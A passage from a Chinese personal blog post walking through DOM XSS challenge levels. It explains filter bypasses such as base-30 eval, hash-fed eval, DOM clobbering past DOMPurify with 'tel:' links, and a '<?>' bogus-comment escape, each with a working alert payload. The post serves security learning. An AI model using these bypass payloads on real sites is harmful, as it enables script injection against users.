+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714174146435.png" alt="image-20250714174146435"></p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714174200405.png" alt="image-20250714174200405"></p>
+<p>这里我们就是利用 这个函数</p>
+<p>那为什么是30进制不是 其他进制 呢？</p>
+<p>我们测试一下29进制</p>
+<p>利用<code>parseInt()</code> 来看一下 转换alert是什么</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714174909597.png" alt="image-20250714174909597"></p>
+<p>这里可以看到 alert 的 t 转换回来消失了！！！ </p>
+<p>为什么呢？</p>
+<p>A B C D E F G H I J K L M N O P Q R S T </p>
+<p>这里我们知道A 是10进制可以进行转换<br>T 在第30位，我们合理的进行推测，T 是不是就是30进制呢？</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714175135098.png" alt="image-20250714175135098"></p>
+<p>所以我30~36都可以进行转换t</p>
+<p>那么我们这个payload <code>eval(8680439..toString(30))(1337)</code>就完全可以绕过过滤，实现<code>xss</code></p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714175432982.png" alt="image-20250714175432982"></p>
+<h6 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以清楚的理解到 是通过 <code>location.hash.slice(1)</code> 这个函数来传值，我们可以通过#来插入我们的恶意代码，但是我们的xss代码并不会进入正则过滤中</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mafia=eval(location.hash.slice(1))#alert(1337)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714175631542.png" alt="image-20250714175631542"></p>
+<h6 id="第三种方法"><a href="#第三种方法" class="headerlink" title="第三种方法"></a>第三种方法</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>(<span class="regexp">/ALERT(1337)/</span>.<span class="property">source</span>.<span class="title function_">toLowerCase</span>())()</span><br></pre></td></tr></table></figure>
+
+<p>因为js是严格区分大小写的 所以我们传入的<code>ALERT</code>  并不会被过滤，我们就要想办法将他转为小写</p>
+<p>这里我们查官方文档了解一下<code>Function()</code>的作用</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714175931432.png" alt="image-20250714175931432"></p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714180008622.png" alt="image-20250714180008622"></p>
+<p>Function()是构造函数</p>
+<p>在看看.source 是啥</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714180718828.png" alt="image-20250714180718828"></p>
+<p>返回正则表达式的文本内容（即 <code>/pattern/flags</code> 中的 <code>pattern</code> 部分），不包含分隔符和标志。</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714180844540.png" alt="image-20250714180844540"></p>
+<p>.toLowerCase()转小写</p>
+<p>这个payload我们就知道先通过Function 构造函数 然后 传入 <code>/ALERT(1337)/</code> 通过.source 获取到<code>ALERT(1337</code> 在通过 <code>toLowerCase()</code> 转成小写 ，最后<code>()</code>立即执行</p>
+<p>这个payload的好处是我们可以绕过他的关键字匹配，构造自己的函数</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714181507067.png" alt="image-20250714181507067"></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function(/ALERT(1337)/.source.toLowerCase())()</span><br></pre></td></tr></table></figure>
+
+<h5 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714181615220.png" alt="image-20250714181615220"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 id=&quot;boomer&quot;&gt;Ok, Boomer.&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    boomer.innerHTML = DOMPurify.sanitize(new URL(location).searchParams.get(&#x27;boomer&#x27;) || &quot;Ok, Boomer&quot;)</span><br><span class="line">    setTimeout(ok, 2000)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>这里他引入了<code>DOMPurify</code>防御用户输入框架，这个框架至今都在维护，而且绕过的概率很低，所以我们不考虑绕过的方法</p>
+<p>看到下面<code>setTimeout(ok, 2000)</code> 这里的<code>ok</code>并没有进行定义</p>
+<p>那么我们可以使用<code>dom clobbering</code>称之为<code>dom</code>破坏技术</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=ok href=javasCript:alert(1337)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们尝试传入这个来重新构造ok函数</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250715113259686.png" alt="image-20250715113259686"></p>
+<p>但是发现被框架过滤了，我们去github上看一下，找一下白名单</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250715113345829.png" alt="image-20250715113345829"></p>
+<p><code>/^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp|matrix):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))</code></p>
+<p>这里测试发现 </p>
+<p><code>mailto|tel|callto|sms|cid|xmpp|matrix</code></p>
+<p>全部都能够触发alert</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?boomer=&lt;a id=ok href=&quot;tel:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714183323651.png" alt="image-20250714183323651"></p>
+<p>那么为什么我们会想到用A标签呢？</p>
+<p>1.我们需要传入一个我们可控得字符，且他能被<code>setTimeout</code> 执行</p>
+<p>toString </p>
+<p>所以我们可以通过以下代码来进⾏fuzz得到可以通过<code>toString</code>⽅法将其转换成字符串类型的标签： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Object.getOwnPropertyNames(window)</span><br><span class="line">.filter(p =&gt; p.match(/Element$/))</span><br><span class="line">.map(p =&gt; window[p])</span><br><span class="line">.filter(p =&gt; p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString</span><br><span class="line">!== Object.prototype.toString) </span><br></pre></td></tr></table></figure>
+
+<p>我们可以得到两种标签对象：<code>HTMLAreaElement ()</code>&amp; <code>HTMLAnchorElement ()</code>，这两个 标签对象我们都可以利⽤href属性来进⾏字符串转换。</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250715114025687.png" alt="image-20250715114025687"></p>
+<p><code>HTMLAreaElement</code>  是<code>area</code>但是他是一个空元素不能容纳任何内容，所以我们不考虑</p>
+<p>那么就只剩下<code>HTMLAnchorElement</code>  这个的意思是锚点的意思，</p>
+<p>也就是跳转，html中哪个标签可以跳转实现呢？</p>
+<p>答案呼之欲出了：A标签的 href属性 </p>
+<p>所以这里dom破坏就是在a标签的herf属性上传入我们的xss代码！</p>
+<h5 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250715172949724.png" alt="image-20250715172949724"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Challenge --&gt;</span><br><span class="line">&lt;div id=&quot;pwnme&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var input = (new URL(location).searchParams.get(&#x27;debug&#x27;) || &#x27;&#x27;).replace(/[\!\-\/\#\&amp;\;\%]/g, &#x27;_&#x27;);</span><br><span class="line">    var template = document.createElement(&#x27;template&#x27;);</span><br><span class="line">    template.innerHTML = input;</span><br><span class="line">    pwnme.innerHTML = &quot;&lt;!-- &lt;p&gt; DEBUG: &quot; + template.outerHTML + &quot; &lt;/p&gt; --&gt;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>这里我们可以看到，对get传参<code>debug</code>进行了过滤</p>
+<p>将 <code>! - / # &amp; ; %</code>  进行了过滤</p>
+<p>那我们现在考虑，在哪个地方可以利用进行dom破坏呢？</p>
+<p>我们知道形如 <code>document.x</code> 这种我们都可以进行dom破坏</p>
+<p>这里我们很容易就发现 <code>template.outerHTML</code>，但是被<code>&lt;!--</code> <code>--&gt;</code> 包裹，而且为多行注释，那么我们如何进行绕过呢？</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718194412725.png" alt="image-20250718194412725"></p>
+<p>我们先不考虑注释符，正常插入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&#x27;1&#x27; onerror=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718210013062.png" alt="image-20250718210013062"></p>
+<p>发现正如我们预料的一样，我们的payload被注释掉了</p>
+<p>那我们就要思考如何来闭合 <code>&lt;!--</code></p>
+<p>经过查找大量资料发现，<code>&lt;?</code>可以把p标签逃逸出来</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718210214704.png" alt="image-20250718210214704"></p>
+<p>那么这是为什么呢？</p>
+<p>下断调试看看</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718211205269.png" alt="image-20250718211205269"></p>
+<p>发现 我们传入的<code>&lt;?</code> 变为了<code> &lt;!--?--&gt;</code> 这样他进入</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718211335880.png" alt="image-20250718211335880"></p>
+<p>就把P标签逃逸出来了</p>
+<p>根据w3c</p>
+<p>规范文档，可以在以下链接找到：</p>
+<p>🔗 <strong>HTML Standard - Parsing HTML Documents</strong><br>🔗 <a target="_blank" rel="noopener" href="https://html.spec.whatwg.org/multipage/parsing.html#parsing-html-documents">https://html.spec.whatwg.org/multipage/parsing.html#parsing-html-documents</a></p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718232910418.png" alt="image-20250718232910418"></p>
+<p>当遇到<code>&lt;</code> 号的时候 会切换到 标签开始状态   <a target="_blank" rel="noopener" href="https://html.spec.whatwg.org/multipage/parsing.html#tag-open-state">tag open state</a>.</p>
+<p>然后</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718233511852.png" alt="image-20250718233511852"></p>
+<p>又因为下一个字符是<code>?</code> 他会进入 <a target="_blank" rel="noopener" href="https://html.spec.whatwg.org/multipage/parsing.html#bogus-comment-state">bogus comment state</a>.</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718233648645.png" alt="image-20250718233648645"></p>
+<p>然后 下一个字符是 <strong>Anything else</strong>  将当前输入字符附加到注释标记的数据中。也就是<code>&lt;!--?--&gt;</code>,</p>
+<p>这里举个列子：输入是aaa&lt;?bbb&gt;ccc的时候，解析到第 i 个字符时，innerHTML 的结果是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">aa</span><br><span class="line">aaa</span><br><span class="line">aaa&lt;</span><br><span class="line">aaa&lt;!--?--&gt;</span><br><span class="line">aaa&lt;!--?b--&gt;</span><br><span class="line">aaa&lt;!--?bb--&gt;</span><br><span class="line">aaa&lt;!--?bbb--&gt;</span><br><span class="line">aaa&lt;!--?bbb--&gt;</span><br><span class="line">aaa&lt;!--?bbb--&gt;c</span><br><span class="line">aaa&lt;!--?bbb--&gt;cc</span><br><span class="line">aaa&lt;!--?bbb--&gt;ccc</span><br></pre></td></tr></table></figure>
+
+<p>直到该状态遇到了&gt;为止，回到 data state。注意这个 Bogus comment state 解析到&gt;的时候会直接回到 data state，也就是 HTML parser 最开始解析的状态，这个时候我们就可以插入 HTML 代码了。</p>
+<p>那么我们就可以试着传值测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&gt;&lt;img src=&#x27;1&#x27; onerror=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718234143650.png" alt="image-20250718234143650"></p>
+<p>也是成功弹窗了，我们再次打断点看看具体是什么流程</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718234243274.png" alt="image-20250718234243274"></p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718234255751.png" alt="image-20250718234255751"></p>
+<p>与我们的预想完全一致</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&gt;&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;?&gt;&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这两个都可以，但是切记不要用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p>原因就是<code>/</code> 被过滤了，就算没被过滤也不会被执行</p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718235939727.png" alt="image-20250718235939727"></p>
+<p>w3c文档清楚的进行了说明</p>
+<p><code>document.write()</code> <code>script </code> <code>innerHTML</code>  <code>outerHTML</code> </p>
+<p><em>使用该方法插入时，元素通常会执行（通常会阻止进一步的脚本执行或 HTML 解析）。当使用 和 属性插入时，它们根本不会执行。</em></p>
+<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250719000131057.png" alt="image-20250719000131057"></p>
+<p>这里他也说明了 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML">官方文档</a></p>
+<h5 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250719000937250.png" alt="image-20250719000937250"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;number id=&quot;number&quot; style=&quot;display:none&quot;&gt;&lt;/number&gt;</span><br><span class="line">&lt;div class=&quot;alert alert-primary&quot; role=&quot;alert&quot; id=&quot;welcome&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;button id=&quot;keanu&quot; class=&quot;btn btn-primary btn-sm&quot; data-toggle=&quot;popover&quot; data-content=&quot;DM @PwnFunction&quot;</span><br><span class="line">    data-trigger=&quot;hover&quot; onclick=&quot;alert(`If you solved it, DM me @PwnFunction :)`)&quot;&gt;Solved it?&lt;/button&gt;</span><br><span class="line">    </span><br><span class="line">&lt;script&gt;</span><br><span class="line">    /* Input */</span><br><span class="line">    var number = (new URL(location).searchParams.get(&#x27;number&#x27;) || &quot;7&quot;)[0],</span><br><span class="line">        name = DOMPurify.sanitize(new URL(location).searchParams.get(&#x27;name&#x27;), &#123; SAFE_FOR_JQUERY: true &#125;);</span><br><span class="line">    $(&#x27;number#number&#x27;).html(number);</span><br><span class="line">    document.getElementById(&#x27;welcome&#x27;).innerHTML = (`Welcome &lt;b&gt;$&#123;name || &quot;Mr. Wick&quot;&#125;!&lt;/b&gt;`);</span><br><span class="line"></span><br><span class="line">    /* Greet */</span><br><span class="line">    $(&#x27;#keanu&#x27;).popover(&#x27;show&#x27;)</span><br><span class="line">    setTimeout(_ =&gt; &#123;</span><br><span class="line">        $(&#x27;#keanu&#x27;).popover(&#x27;hide&#x27;)</span><br><span class="line">    &#125;, 2000)</span><br><span class="line"></span><br><span class="line">    /* Check Magic Number */</span><br><span class="line">    var magicNumber = Math.floor(Math.random() * 10);</span><br><span class="line">    var number = eval($(&#x27;number#number&#x27;).html());</span><br><span class="line">    if (magicNumber === number) &#123;</span><br><span class="line">        alert(&quot;You&#x27;re Breathtaking!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">JGwebre</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://heisha123.github.io/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/">https://heisha123.github.io/2025/07/14/XSS-DOM破坏/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本站点所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://heisha123.github.io">JG的个人博客</a>！</span></div></div><div class="post-copyright valine" id="comments-container"><script src="//unpkg.com/valine@1.4.14/dist/Valine.min.js"></script><script>let arr = location.href.split('/#more')[0].split('/');
+let title = arr[arr.length - 1];
+if (title === '') {
+    title = arr[arr.length - 2];
+}
+var flag = false;
+var gitFun = function () {
+    try {
+        var valineObj = window.GLOBAL_CONFIG.valine;
+        new Valine({
+            el: "#comments-container",
+            ...valineObj
+        });
+        flag = true;
+    } catch (e) {
+        flag = false;
+    }
+}
+var setIn = setInterval(() => {
+    if (!flag) {
+        gitFun();
+    } else {
+        clearInterval(setIn);
+    }
+}, 200);</script></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/07/18/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/"><i class="fas fa-angle-left">&nbsp;</i><span>[网鼎杯 2020 青龙组]notes</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/07/14/XSS-%E5%85%A8/"><span>XSS-全</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2025 By JGwebre</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>
